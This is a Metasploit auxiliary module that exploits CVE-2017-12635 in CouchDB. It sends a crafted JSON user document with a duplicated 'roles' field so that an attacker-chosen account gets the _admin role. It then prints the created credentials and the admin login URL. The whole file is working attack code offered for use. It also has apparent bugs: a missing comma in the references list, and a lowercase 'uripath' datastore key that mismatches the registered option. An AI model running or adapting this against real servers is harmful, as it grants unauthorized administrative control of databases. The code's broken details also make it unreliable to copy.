##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  Rank = NormalRanking
  include Msf::Exploit::Remote::HttpClient

    def initialize(info = {})
      super(update_info(info,
        'Name' => 'CouchDB user creation with Admin role',
        'Description' =>
        %q{
          Create arbitrary user and assign to admin role on CouchDB version between 1.7.0 and 2.x before 2.1.1
        },
        'Author' => 'Hendrik Van Belleghem - hendrikvb',
        'Version' => '0.01',
        'License' => MSF_LICENSE,
        'References' =>
          [
            ['CVE','2017-12635']
            ['URL','https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635'],
            ['URL','https://justi.cz/security/2017/11/14/couchdb-rce-npm.html'],
          ]
      ))

      register_options(
        [
          OptString.new('URIPATH', [true, 'The base path', '/_users/org.couchdb.user:']),
          OptString.new('RPORT', [true, 'CouchDB Port', '5984']),
          OptString.new('RHOST', [true, 'CouchDB Host', '']),
          OptString.new('USER', [true, 'CouchDB Username', Rex::Text.rand_text_alpha(12,"")]),
          OptString.new('PASSWORD', [true, 'CouchDB Password', Rex::Text.rand_text_alpha(12,"")]),
          OptString.new('ROLES', [true, 'CouchDB Roles', '_admin'])
        ], self.class)
        
    end

    def run 
      rport = datastore['RPORT']
      rhost = datastore['RHOST']
      user = datastore['USER']
      password = datastore['PASSWORD']
      roles = datastore['ROLES']
      useragent = datastore['USERAGENT']
      timeout = datastore['TIMEOUT']
      uripath = datastore['URIPATH']
      
      data = "{
\"type\": \"user\",
\"name\": \"#{user}\",
\"roles\": [\"#{roles}\"],
\"roles\": [],
\"password\": \"#{password}\"
}"
      res = send_request_cgi(
        {
          'uri'    => "http://#{rhost}:#{rport}#{datastore['uripath']}#{user}", # http://hostname:port/_users/org.couchdb.user:username
          'method' => 'PUT',
          'ctype'  => 'text/json',
          'data'   => data,
        }, timeout)
    
      if res && res.code == 200
        print_good("User #{user} created with password #{password}. Connect to http://#{rhost}:#{rport}/_utils/ to login.")
      else
        print_error("No 200, feeling blue")
      end
    end
  end
